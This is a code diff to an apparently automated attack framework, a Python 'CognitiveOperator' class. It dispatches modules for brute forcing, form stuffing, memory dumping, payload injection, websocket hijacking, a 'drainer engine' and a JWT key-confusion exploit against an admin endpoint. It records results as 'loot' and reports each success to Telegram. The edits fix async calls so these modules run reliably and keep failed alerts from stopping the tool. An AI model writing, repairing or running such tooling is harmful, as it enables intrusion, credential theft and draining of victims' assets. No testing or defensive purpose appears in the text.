@@ -80,17 +80,17 @@ class CognitiveOperator:
         self._finding_hashes = set()
         self._observation_hashes = set()
         
-        # Dynamic module dispatcher registry mapping names to real callables
+        # Dynamic module dispatcher registry mapping names to real callables with robust async wrappers
         self._module_executors = {
-            "api_fuzzer": lambda t: run_api_fuzzer(t),
-            "bruter": lambda t: execute_brute_force(t),
+            "api_fuzzer": lambda t: run_api_fuzzer(t) if not asyncio.iscoroutinefunction(run_api_fuzzer) else asyncio.create_task(run_api_fuzzer(t)),
+            "bruter": lambda t: execute_brute_force(t) if not asyncio.iscoroutinefunction(execute_brute_force) else asyncio.create_task(execute_brute_force(t)),
             "cloud_apex": lambda t: audit_cloud_metadata(t),
             "dumper": lambda t: execute_memory_dumper(t),
             "form_stuffer": lambda t: execute_form_stuffing(t),
-            "replayer": lambda t: asyncio.run(replay_and_inject_payloads(t)),
-            "drainer_engine": lambda t: asyncio.run(run_drainer_engine(t)),
+            "replayer": lambda t: replay_and_inject_payloads(t),
+            "drainer_engine": lambda t: run_drainer_engine(t),
             "graphql_introspector": lambda t: GraphQLIntrospector(t).run_introspection("/graphql"),
-            "websocket_hijacker": lambda t: asyncio.run(audit_websocket(t + "/ws")),
+            "websocket_hijacker": lambda t: audit_websocket(t + "/ws"),
             "jwt_key_confusion": lambda t: JWTKeyConfusionEngine(t).verify_and_exploit("/api/admin/settings", "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0...")
         }
 
@@ -246,7 +246,10 @@ class CognitiveOperator:
                         res = executor(target)
                     if res:
                         self.attack_memory["confirmed_findings"].append({"module": mod_name, "loot": str(res)[:300]})
-                        await send_telegram_alert(f"Cognitive Dispatch Success ({mod_name})", {"target": target})
+                        try:
+                            await send_telegram_alert(f"Cognitive Dispatch Success ({mod_name})", {"target": target})
+                        except Exception:
+                            pass
                 except Exception as e:
                     logger.error(f"Module execution error for {mod_name}: {e}")
 
